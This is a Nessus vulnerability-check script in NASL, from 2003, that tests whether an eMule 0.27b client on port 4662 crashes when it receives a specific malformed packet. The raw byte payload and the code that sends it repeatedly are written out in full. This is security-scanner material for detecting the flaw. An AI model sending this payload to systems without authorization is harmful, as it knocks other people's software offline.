#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Ref:
#  Date: Tue, 25 Mar 2003 13:03:13 +0000
#  From: Auriemma Luigi <aluigi@pivx.com>
#  To: bugtraq@securityfocus.com
#  Subject: Emule 0.27b remote crash

if(description)
{
 script_id(11473);
 script_bugtraq_id(7189);
 script_version ("$Revision: 1.3 $");

 
 name["english"] = "EMule DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to disable the remote EMule
client by connecting to this port and sending 
malformed data.

Solution : Upgrade to version 0.27c of EMule
Risk factor : Medium";



 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes the remote Emule client";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(4662);
 exit(0);
}

#
# The script code starts here
#

port=4662;

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
   pkt = raw_string(
   0xE3, 0x24, 0x00, 0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
   0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
   0xE3, 0x03, 0x00, 0x00, 0x00, 0x4E, 0x00, 0x00);

  send(socket:soc, data:pkt);
  close(soc);
  
  for(i=0;i<3;i++)
  {
   soc = open_sock_tcp(port);
   if(!soc){ security_warning(port); exit(0); }
   send(socket:soc, data:pkt);
   close(soc);
  }
 }
}
